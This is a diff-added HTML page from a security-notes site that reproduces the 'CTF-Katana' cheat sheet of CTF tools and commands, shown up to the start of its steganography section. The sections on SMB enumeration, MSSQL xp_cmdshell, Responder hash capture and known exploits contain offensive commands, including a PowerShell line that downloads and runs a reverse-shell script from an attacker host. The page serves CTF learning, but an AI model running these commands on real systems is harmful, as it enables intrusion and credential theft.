href="../03-ctf/htb-explosion.html"><strong aria-hidden="true">8.4.4.</strong> Explosion</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-preignition.html"><strong aria-hidden="true">8.4.5.</strong> Preignition</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-appointment.html"><strong aria-hidden="true">8.4.6.</strong> Appointment</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-sequel.html"><strong aria-hidden="true">8.4.7.</strong> Sequel</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-crocodile.html"><strong aria-hidden="true">8.4.8.</strong> Crocodile</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-archetype.html"><strong aria-hidden="true">8.4.9.</strong> Archetype</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-oopsie.html"><strong aria-hidden="true">8.4.10.</strong> Oopsie</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-vaccine.html"><strong aria-hidden="true">8.4.11.</strong> Vaccine</a></li><li class="chapter-item expanded "><a href="../03-ctf/htb-unified.html"><strong aria-hidden="true">8.4.12.</strong> Unified</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.5.</strong> Cryptography</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.6.</strong> Reverse Engineering</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.7.</strong> Web</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.8.</strong> Forensic</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.9.</strong> Miscellaneous</div></li><li class="chapter-item expanded "><a href="../03-ctf/assembly.html"><strong aria-hidden="true">8.10.</strong> Assembly</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/assembly-basic-syntax.html"><strong aria-hidden="true">8.10.1.</strong> Basic Syntax</a></li><li class="chapter-item expanded "><a href="../03-ctf/assembly-registers.html"><strong aria-hidden="true">8.10.2.</strong> Registers</a></li><li class="chapter-item expanded "><a href="../03-ctf/assembly-syscalls.html"><strong aria-hidden="true">8.10.3.</strong> System Calls</a></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/john-hammond.html" class="active"><strong aria-hidden="true">8.11.</strong> John-Hammond</a></li><li class="chapter-item expanded "><a href="../03-ctf/ctflicense.html"><strong aria-hidden="true">8.12.</strong> Contoh cracking CTF licence key</a></li><li class="chapter-item expanded "><a href="../03-ctf/writeup.html"><strong aria-hidden="true">8.13.</strong> Writeup</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/compfest.html"><strong aria-hidden="true">8.13.1.</strong> COMPFEST CTF 2021</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../03-ctf/compfest-snab.html"><strong aria-hidden="true">8.13.1.1.</strong> Snab? Yes, Snab</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../03-ctf/ctf-random.html"><strong aria-hidden="true">8.14.</strong> Random</a></li></ol></li><li class="chapter-item expanded "><a href="../08-kali/index.html"><strong aria-hidden="true">9.</strong> Kali Linux Tools</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../08-kali/sqlmap.html"><strong aria-hidden="true">9.1.</strong> sqlmap</a></li></ol></li><li class="chapter-item expanded "><a href="../06-tools/index.html"><strong aria-hidden="true">10.</strong> Tools</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../06-tools/nmap.html"><strong aria-hidden="true">10.1.</strong> Nmap</a></li><li class="chapter-item expanded "><a href="../06-tools/python.html"><strong aria-hidden="true">10.2.</strong> Python</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../06-tools/python-pwn.html"><strong aria-hidden="true">10.2.1.</strong> Pwn</a></li><li class="chapter-item expanded "><a href="../06-tools/python-random.html"><strong aria-hidden="true">10.2.2.</strong> Random</a></li><li class="chapter-item expanded "><a href="../06-tools/python-zlib.html"><strong aria-hidden="true">10.2.3.</strong> Zlib</a></li><li class="chapter-item expanded "><a href="../06-tools/python-req.html"><strong aria-hidden="true">10.2.4.</strong> Request</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../06-tools/python-req-get.html"><strong aria-hidden="true">10.2.4.1.</strong> GET</a></li><li class="chapter-item expanded "><a href="../06-tools/python-req-post.html"><strong aria-hidden="true">10.2.4.2.</strong> POST</a></li></ol></li><li class="chapter-item expanded "><a href="../06-tools/python-linkedlist.html"><strong aria-hidden="true">10.2.5.</strong> linkedlist</a></li></ol></li><li class="chapter-item expanded "><a href="../06-tools/c.html"><strong aria-hidden="true">10.3.</strong> C</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../06-tools/c-fflush.html"><strong aria-hidden="true">10.3.1.</strong> fflush()</a></li><li class="chapter-item expanded "><a href="../06-tools/c-memset.html"><strong aria-hidden="true">10.3.2.</strong> memset()</a></li></ol></li><li class="chapter-item expanded "><a href="../06-tools/curl.html"><strong aria-hidden="true">10.4.</strong> Curl</a></li><li class="chapter-item expanded "><a href="../06-tools/tcpdump.html"><strong aria-hidden="true">10.5.</strong> Tcpdump</a></li><li class="chapter-item expanded "><a href="../06-tools/gdb.html"><strong aria-hidden="true">10.6.</strong> GDB</a></li><li class="chapter-item expanded "><a href="../06-tools/radare2.html"><strong aria-hidden="true">10.7.</strong> Radare2</a></li><li class="chapter-item expanded "><a href="../06-tools/cutter.html"><strong aria-hidden="true">10.8.</strong> Cutter</a></li><li class="chapter-item expanded "><a href="../06-tools/fcrackzip.html"><strong aria-hidden="true">10.9.</strong> fcrackzip</a></li><li class="chapter-item expanded "><a href="../06-tools/ngrok.html"><strong aria-hidden="true">10.10.</strong> ngrok</a></li><li class="chapter-item expanded "><a href="../06-tools/netcat.html"><strong aria-hidden="true">10.11.</strong> Netcat</a></li><li class="chapter-item expanded "><a href="../06-tools/shell-script.html"><strong aria-hidden="true">10.12.</strong> Shell Script</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../06-tools/shell-spcChar.html"><strong aria-hidden="true">10.12.1.</strong> Special Character</a></li><li class="chapter-item expanded "><a href="../06-tools/shell-Operators.html"><strong aria-hidden="true">10.12.2.</strong> Operators</a></li><li class="chapter-item expanded "><a href="../06-tools/shell-Array.html"><strong aria-hidden="true">10.12.3.</strong> Array</a></li><li class="chapter-item expanded "><a href="../06-tools/shell-decision.html"><strong aria-hidden="true">10.12.4.</strong> Decision</a></li><li class="chapter-item expanded "><a href="../06-tools/shell-loop.html"><strong aria-hidden="true">10.12.5.</strong> Loop</a></li></ol></li><li class="chapter-item expanded "><a href="../06-tools/openssl.html"><strong aria-hidden="true">10.13.</strong> OpenSSL</a></li><li class="chapter-item expanded "><a href="../06-tools/archive.html"><strong aria-hidden="true">10.14.</strong> Archive File</a></li><li class="chapter-item expanded "><a href="../06-tools/hydra.html"><strong aria-hidden="true">10.15.</strong> Hydra</a></li><li class="chapter-item expanded "><a href="../06-tools/ironbee.html"><strong aria-hidden="true">10.16.</strong> IronBee</a></li><li class="chapter-item expanded "><a href="../06-tools/modsecurity.html"><strong aria-hidden="true">10.17.</strong> ModSecurity</a></li><li class="chapter-item expanded "><a href="../06-tools/commix.html"><strong aria-hidden="true">10.18.</strong> Commix</a></li><li class="chapter-item expanded "><a href="../06-tools/burpsuite.html"><strong aria-hidden="true">10.19.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="../06-tools/owasp.html"><strong aria-hidden="true">10.20.</strong> OWASP</a></li><li class="chapter-item expanded "><a href="../06-tools/maltego.html"><strong aria-hidden="true">10.21.</strong> Maltego</a></li><li class="chapter-item expanded "><a href="../06-tools/gns3.html"><strong aria-hidden="true">10.22.</strong> GNS3</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">10.23.</strong> Ghidra</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">10.24.</strong> Ida</div></li></ol></li><li class="chapter-item expanded "><a href="../04-tips/index.html"><strong aria-hidden="true">11.</strong> TIPS</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../04-tips/guide-this-website.html"><strong aria-hidden="true">11.1.</strong> Guide This Web</a></li><li class="chapter-item expanded "><a href="../04-tips/mdbook.html"><strong aria-hidden="true">11.2.</strong> Mdbook</a></li><li class="chapter-item expanded "><a href="../04-tips/github.html"><strong aria-hidden="true">11.3.</strong> Github</a></li><li class="chapter-item expanded "><a href="../04-tips/deb-file.html"><strong aria-hidden="true">11.4.</strong> Install / Remove .deb in ubuntu</a></li><li class="chapter-item expanded "><a href="../04-tips/sql-server.html"><strong aria-hidden="true">11.5.</strong> Install sql server ubuntu 20.04</a></li><li class="chapter-item expanded "><a href="../04-tips/set-ip-static.html"><strong aria-hidden="true">11.6.</strong> Setting IP Static</a></li><li class="chapter-item expanded "><a href="../04-tips/set-https.html"><strong aria-hidden="true">11.7.</strong> HTTPS in Local Network (Ubuntu Server 20.04)</a></li><li class="chapter-item expanded "><a href="../04-tips/itcareer.html"><strong aria-hidden="true">11.8.</strong> IT Career Roadmap</a></li><li class="chapter-item expanded "><a href="../04-tips/wlan-monitor-mode.html"><strong aria-hidden="true">11.9.</strong> Wlan Monitor Mode</a></li><li class="chapter-item expanded "><a href="../04-tips/virtualbox.html"><strong aria-hidden="true">11.10.</strong> Virtualbox</a></li><li class="chapter-item expanded "><a href="../04-tips/terminal-path.html"><strong aria-hidden="true">11.11.</strong> Path variable terminal</a></li><li class="chapter-item expanded "><a href="../04-tips/linux-user-group.html"><strong aria-hidden="true">11.12.</strong> Linux Users &amp; Groups</a></li><li class="chapter-item expanded "><a href="../04-tips/replikasi-onnocenter.html"><strong aria-hidden="true">11.13.</strong> Replikasi Onnocenter</a></li><li class="chapter-item expanded "><a href="../04-tips/moodle.html"><strong aria-hidden="true">11.14.</strong> Install Moodle</a></li><li class="chapter-item expanded "><a href="../04-tips/ros.html"><strong aria-hidden="true">11.15.</strong> Install ROS</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../04-tips/ros-melodic.html"><strong aria-hidden="true">11.15.1.</strong> ROS Melodic</a></li><li class="chapter-item expanded "><a href="../04-tips/ros-noetic.html"><strong aria-hidden="true">11.15.2.</strong> ROS Noetic</a></li><li class="chapter-item expanded "><a href="../04-tips/ros-opencv.html"><strong aria-hidden="true">11.15.3.</strong> Install ROS &amp; Opencv</a></li></ol></li><li class="chapter-item expanded "><a href="../04-tips/hapus-dualboot.html"><strong aria-hidden="true">11.16.</strong> Hapus Dual Boot</a></li><li class="chapter-item expanded "><a href="../04-tips/membuat-file-iso.html"><strong aria-hidden="true">11.17.</strong> Membuat File ISO</a></li><li class="chapter-item expanded "><a href="../04-tips/docker.html"><strong aria-hidden="true">11.18.</strong> Docker</a></li><li class="chapter-item expanded "><a href="../04-tips/tips-random.html"><strong aria-hidden="true">11.19.</strong> Random</a></li></ol></li><li class="chapter-item expanded "><a href="../08-ujian/index.html"><strong aria-hidden="true">12.</strong> Pembahasan Ujian</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">12.1.</strong> Cisco Packet Tracer</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../08-ujian/cisco-pt-quiz1.html"><strong aria-hidden="true">12.1.1.</strong> Quiz 1</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.1.2.</strong> Quiz 2</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.2.</strong> Cisco Introduction to CyberSec</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../08-ujian/cisco-ics-quiz1.html"><strong aria-hidden="true">12.2.1.</strong> Chapter 1 Quiz</a></li><li class="chapter-item expanded "><a href="../08-ujian/cisco-ics-quiz2.html"><strong aria-hidden="true">12.2.2.</strong> Chapter 2 Quiz</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.3.</strong> Onnocenter/moodle</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">12.3.1.</strong> Jaringan Komputer</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">12.3.1.1.</strong> TCP/IP</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">12.3.1.2.</strong> DNS</div></li></ol></li></ol></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">Wetofu</h1>
+
+                    <div class="right-buttons">
+                        
+                        
+                        <a href="https://github.com/syahrolus" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="ctf-katana"><a class="header" href="#ctf-katana">CTF-Katana</a></h1>
+<blockquote>
+<p>John Hammond | February 1st, 2018</p>
+</blockquote>
+<hr />
+<p>This repository, at the time of writing, will just host a listing of tools and commands that may help with CTF challenges. I hope to keep it as a &quot;live document,&quot; and ideally it will not die out like the old &quot;tools&quot; page I had made (<a href="https://github.com/USCGA/tools">https://github.com/USCGA/tools</a>).</p>
+<p><strong>The formal tool that automates some of this low-hanging fruit checking is
+finally released. Katana is available at <a href="https://github.com/JohnHammond/katana">https://github.com/JohnHammond/katana</a>.</strong> Pull-requests and contributions
+are welcome!</p>
+<hr />
+<h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
+<ol>
+<li><a href="#post-exploitation">Post-Exploitation</a></li>
+<li><a href="#port-enumeration">Port Enumeration</a></li>
+<li><a href="#445-smbsamba">445 (smb/Samba)</a></li>
+<li><a href="#1433-microsoft-sql-server">1433 (Microsoft SQL Server)</a></li>
+<li><a href="#snmp">SNMP</a></li>
+<li><a href="#microsoft-office-macros">Microsoft Office Macros</a></li>
+<li><a href="#retrieving-network-service-hashes">Retrieving Network Service Hashes</a></li>
+<li><a href="#windows-reverse-shells">Windows Reverse Shells</a></li>
+<li><a href="#known-exploits">Known Exploits</a></li>
+<li><a href="#excess">Excess</a></li>
+<li><a href="#esoteric-languages">Esoteric Languages</a></li>
+<li><a href="#steganography">Steganography</a></li>
+<li><a href="#cryptography">Cryptography</a></li>
+<li><a href="#networking">Networking</a></li>
+<li><a href="#php">PHP</a></li>
+<li><a href="#pdf-files">PDF Files</a></li>
+<li><a href="#forensics">Forensics</a></li>
+<li><a href="#png-file-forensics">PNG File Forensics</a></li>
+<li><a href="#apk-forensics">APK Forensics</a></li>
+<li><a href="#web">Web</a></li>
+<li><a href="#reverse-engineering">Reverse Engineering</a></li>
+<li><a href="#powerShell">PowerShell</a></li>
+<li><a href="#windows-executables">Windows Executables</a></li>
+<li><a href="#python-reversing">Python Reversing</a></li>
+<li><a href="#binary-exploitationpwn">Binary Exploitation/pwn</a></li>
+<li><a href="#visualbasicscript-reversing">VisualBasicScript Reversing</a></li>
+<li><a href="#miscellaneous">Miscellaneous</a></li>
+<li><a href="#jail-breaks">Jail Breaks</a></li>
+<li><a href="#trivia">Trivia</a></li>
+</ol>
+<hr />
+<h1 id="post-exploitation"><a class="header" href="#post-exploitation">Post-Exploitation</a></h1>
+<ul>
+<li>
+<p><a href="https://github.com/andrew-d/static-binaries">static-binaries</a></p>
+<p>If you need to use a program that is not on the box you just broke into, try and build a static binary! I've seen this used on Fatty for HackTheBox, getting a <code>pty</code> with the typical <code>python -c 'import pty...'</code> trick when it didn't have Python originally!</p>
+<p>https://github.com/andrew-d/static-binaries</p>
+</li>
+</ul>
+<h1 id="port-enumeration"><a class="header" href="#port-enumeration">Port Enumeration</a></h1>
+<h2 id="445-smbsamba"><a class="header" href="#445-smbsamba">445 (smb/Samba)</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/ShawnDEvans/smbmap"><code>smbmap</code></a></p>
+<p><code>smbmap</code> tells you permissions and access, which <code>smbclient</code> does <em>not</em> do!</p>
+<p>To try and list shares as the anonymous user <strong>DO THIS</strong> (this doesn't always work for some weird reason)</p>
+</li>
+</ul>
+<pre><code>smbmap -H 10.10.10.125 -u anonymous
+</code></pre>
+<p>Or you can attempt just:</p>
+<pre><code>smbmap -H 10.10.10.125
+</code></pre>
+<p>And you can specify a domain like so:</p>
+<pre><code>smbmap -H 10.10.10.125 -u anonymous -d HTB.LOCAL
+</code></pre>
+<p>Worth trying <code>localhost</code> as a domain, if that gets &quot;NO_LOGON_SERVERS&quot;</p>
+<pre><code>smbmap -H 10.10.10.125 -u anonymous -d localhost
+</code></pre>
+<ul>
+<li><code>enum4linux</code></li>
+</ul>
+<pre><code>enum4linux 10.10.10.125
+</code></pre>
+<ul>
+<li>
+<p><code>smbclient</code></p>
+<p><strong>NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S&lt;B version 1 or SMB version 2. You can dp this with <code>-m SMB2</code>. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 <em>by default</em>.</strong></p>
+<p>You can use <code>smbclient</code> to look through files shared with SMB. To <em>list</em> available shares:</p>
+</li>
+</ul>
+<pre><code>smbclient -m SMB2 -N -L //10.10.10.125/
+</code></pre>
+<p>Once you find a share you want to/can access, you can connect to shares by using the name following the locator:</p>
+<pre><code>smbclient -m SMB2 -N //10.10.10.125/Reports
+</code></pre>
+<p>You will see a <code>smb: \&gt;</code> prompt, and you can use <code>ls</code> and <code>get</code> to retrieve files or even <code>put</code> if you need to place files there.</p>
+<h2 id="1433-microsoft-sql-server"><a class="header" href="#1433-microsoft-sql-server">1433 (Microsoft SQL Server)</a></h2>
+<ul>
+<li>
+<p><code>impacket</code> -&gt; <code>mssqlclient.py</code></p>
+<p>You can connect to a Microsoft SQL Server with <code>myssqlclient.py</code> knowing a username and password like so:</p>
+</li>
+</ul>
+<pre><code>mssqlclient.py username@10.10.10.125
+</code></pre>
+<p>It will prompt you for a password. <strong>If your password fails, the server might be using &quot;Windows authentication&quot;, which you can use with:</strong></p>
+<pre><code>mssqlclient.py username@10.10.10.125 -windows-auth
+</code></pre>
+<p>If you have access to a Micosoft SQL Server, you can try and <code>enable_xp_cmdshell</code> to run commands. With <code>mssqlclient.py</code> you can try:</p>
+<pre><code>SQL&gt; enable_xp_cmdshell
+</code></pre>
+<p>though, you may not have permission. If that DOES succeed, you can now run commands like:</p>
+<pre><code>SQL&gt; xp_cmdshell whoami
+</code></pre>
+<h2 id="snmp"><a class="header" href="#snmp">SNMP</a></h2>
+<ul>
+<li>snmp-check</li>
+</ul>
+<pre><code>snmp-check 10.10.10.125
+</code></pre>
+<h2 id="microsoft-office-macros"><a class="header" href="#microsoft-office-macros">Microsoft Office Macros</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/decalage2/oletools"><code>oletools</code></a> -&gt; <code>olevba</code></p>
+<p><code>olevba</code> can look for Macros within office documents (which you should always check) with just supplying the filename:</p>
+</li>
+</ul>
+<pre><code>olevba &quot;Currency Volume Report.xlsm&quot;
+</code></pre>
+<h2 id="retrieving-network-service-hashes"><a class="header" href="#retrieving-network-service-hashes">Retrieving Network Service Hashes</a></h2>
+<ul>
+<li><a href="https://github.com/SpiderLabs/Responder"><code>Responder.py</code></a></li>
+</ul>
+<pre><code>./Responder.py -I tun0
+</code></pre>
+<h2 id="windows-reverse-shells"><a class="header" href="#windows-reverse-shells">Windows Reverse Shells</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/samratashok/nishang">Nishang</a></p>
+<p>If you have access to PowerShell,  you can get a Reverse shell by using <a href="https://github.com/samratashok/nishang">nishang</a>'s <code>Invoke-PowerShellTcp.ps1</code> script inside of the <code>Shells</code> directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):</p>
+</li>
+</ul>
+<pre><code>python -m SimpleHTTPServer
+</code></pre>
+<p>and then on the victim machine:</p>
+<pre><code>powershell IEX( New-Object Net.WebClient).DownloadString(&quot;http://10.10.14.6:8000/reverse.ps1&quot;) )
+</code></pre>
+<p>Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility <code>rlwrap</code> before your netcat listener command.</p>
+<pre><code>rlwrap nc -lnvp 9001
+</code></pre>
+<h2 id="known-exploits"><a class="header" href="#known-exploits">Known Exploits</a></h2>
+<ul>
+<li>
+<p>Java RMI</p>
+<p>Metasploit module: <code>exploit/multi/misc/java_rmi_server</code></p>
+<p>When testing this, responses are <em>known to come back with an error or exception</em>. Your code MAY VERY WELL still be executing. Try and run commands that include a callback. And <em>use Python</em> to live off the land and try avoid special characters, like <code>|</code> pipes! <a href="https://github.com/frohoff/ysoserial">ysoserial</a> is a good tool for deserializing Java code to take advantage of this vulnerability.</p>
+</li>
+<li>
+<p>Heartbleed</p>
+<p>Metasploit module: <code>auxiliary/scanner/ssl/openssl_heartbleed</code></p>
+<p>Be sure to use <code>set VERBOSE true</code> to see the retrieved results. This can often contain a flag or some valuable information.</p>
+</li>
+<li>
+<p>libssh - SSH</p>
+<p><code>libssh0.8.1</code> (or others??) is vulnerable to an easy and immediate login. Metasploit module: <code>auxiliary/scanner/ssh/libssh_auth_bypass</code>. Be sure to <code>set spawn_pty true</code> to actually receive a shell! Then <code>sessions -i 1</code> to interact with the shell spawned (or whatever appropriate ID)</p>
+</li>
+<li>
+<p>Bruteforcing RDP</p>
+<p>Bruteforcing RDP with <code>hydra</code> or <code>ncrack</code> is <strong>NOT ALWAYS ADVISABLE</strong> because of Cred-SSB. An option <em>might</em> be to script xrdp to automate against a password or word list... <strong>but THIS IS NOT TESTED</strong>.</p>
+</li>
+<li>
+<p>Apache Tomcat</p>
+<p>If you can determine that you are working with an Apache Tomcat server (usually by visiting pages that do not exist and seeing a 404 error message), try to visit <code>/Manager</code>, which is usually accessible on Tomcat. Possible credentials could be <code>tomcat:tomcat</code>, <code>tomcat:s3cr3t</code>, <code>admin:s3cr3t</code>, <code>root:s3cr3t</code>, etc. etc.. Worthy of bruteforcing with <code>hydra</code>.</p>
+<p>If you see URLs are appended with a <code>.action</code> (not a <code>.do</code>), you may be working with Apache Struts.</p>
+</li>
+<li>
+<p>Apache Struts</p>
+<p>To identify the Apache Struts version is running,</p>
+</li>
+</ul>
+<h2 id="excess"><a class="header" href="#excess">Excess</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/derv82/wifite2">wifite2</a></p>
+<p>Brute-force a Wi-Fi access point.</p>
+</li>
+<li>
+<p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
+<p>Tool to quickly spin up a Samba share.</p>
+</li>
+<li>
+<p><a href="https://github.com/portcullislabs/enum4linux">enum4linux</a></p>
+<p>Script to scan Windows Samba shares. VERY GOOD TO RUN FOR WINDOWS ENUMERATION.</p>
+</li>
+<li>
+<p><a href="https://github.com/dreadlocked/Drupalgeddon2">drupalgeddon2</a></p>
+<p>Attack script for old or outdated Drupal servers. Usually very effective.</p>
+</li>
+</ul>
+<h2 id="esoteric-languages"><a class="header" href="#esoteric-languages">Esoteric Languages</a></h2>
+<ul>
+<li>
+<p><a href="https://tio.run/">Try It Online</a></p>
+<p>An online tool that has a ton of Esoteric language interpreters.</p>
+</li>
+<li>
+<p><a href="https://esolangs.org/wiki/brainfuck">Brainfuck</a></p>
+<p>This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: <a href="https://copy.sh/brainfuck/">https://copy.sh/brainfuck/</a> Some example code:</p>
+</li>
+</ul>
+<pre><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
+--.++++++++++++.--------.&lt;------------.&lt;++.&gt;&gt;----.+.&lt;+++++++++++.+++++++++++++.&gt;+++++++++++++++++.-------------
+--.++++.+++++++++++++++.&lt;&lt;.&gt;&gt;-------.&lt;+++++++++++++++.&gt;+++..++++.--------.+++.&lt;+++.&lt;++++++++++++++++++++++++++
+.&lt;++++++++++++++++++++++.&gt;++++++++++++++..&gt;+.----.&gt;------.+++++++.--------.&lt;+++.&gt;++++++++++++..-------.++.
+</code></pre>
+<ul>
+<li>
+<p><a href="https://esolangs.org/wiki/COW">COW</a></p>
+<p>This language is easily identified by numerous &quot;MOO&quot; statements and random capitalization. It has an option on <a href="https://tio.run/">https://tio.run/</a> Some example code:</p>
+</li>
+</ul>
+<pre><code> MoO moO MoO mOo MOO OOM MMM moO moO
+ MMM mOo mOo moO MMM mOo MMM moO moO
+ MOO MOo mOo MoO moO moo mOo mOo moo
+</code></pre>
+<ul>
+<li>
+<p><a href="https://esolangs.org/wiki/malbolge">Malboge</a></p>
+<p>An esoteric language that looks a lot like Base85... but isn't. Often has references to &quot;Inferno&quot; or &quot;Hell&quot; or &quot;Dante.&quot; Online interpreters like so: <a href="http://www.malbolge.doleczek.pl/">http://www.malbolge.doleczek.pl/</a> Some example code:</p>
+</li>
+</ul>
+<pre><code>(=&lt;`#9]~6ZY32Vx/4Rs+0No-&amp;Jk)&quot;Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
+</code></pre>
+<ul>
+<li>
+<p><a href="https://esolangs.org/wiki/piet">Piet</a></p>
+<p>A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool <a href="https://www.bertnase.de/npiet/"><code>npiet</code></a></p>
+</li>
+</ul>
+<p><img src="https://www.bertnase.de/npiet/hi.png" alt="https://www.bertnase.de/npiet/hi.png" /></p>
+<ul>
+<li>
+<p><a href="http://esolangs.org/wiki/ook!">Ook!</a></p>
+<p>A joke language. Recognizable by <code>.</code> and <code>?</code>, and <code>!</code>. Online interpreter for this language: <a href="https://www.dcode.fr/ook-language">https://www.dcode.fr/ook-language</a> Some example code:</p>
+</li>
+</ul>
+<pre><code>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
+Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
+Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+</code></pre>
+<ul>
+<li>
+<p><a href="https://esolangs.org/wiki/Rockstar">Rockstar</a></p>
+<p>A language intended to look like song lyrics <a href="https://github.com/RockstarLang/rockstar">github link</a>.
+Rockstar has an official online interpreter which you can find here: <a href="https://codewithrockstar.com/online">https://codewithrockstar.com/online</a></p>
+<p>below is fizzbuzz in Rockstar:</p>
+</li>
+</ul>
+<pre><code>Midnight takes your heart and your soul
+While your heart is as high as your soul
+Put your heart without your soul into your heart
+
+Give back your heart
+
+
+Desire is a lovestruck ladykiller
+My world is nothing
+Fire is ice
+Hate is water
+Until my world is Desire,
+Build my world up
+If Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing
+Shout &quot;FizzBuzz!&quot;
+Take it to the top
+
+If Midnight taking my world, Fire is nothing
+Shout &quot;Fizz!&quot;
+Take it to the top
+
+If Midnight taking my world, Hate is nothing
+Say &quot;Buzz!&quot;
+Take it to the top
+
+Whisper my world
+</code></pre>
+<h2 id="steganography"><a class="header" href="#steganography">Steganography</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/Paradoxis/StegCracker">StegCracker</a></p>
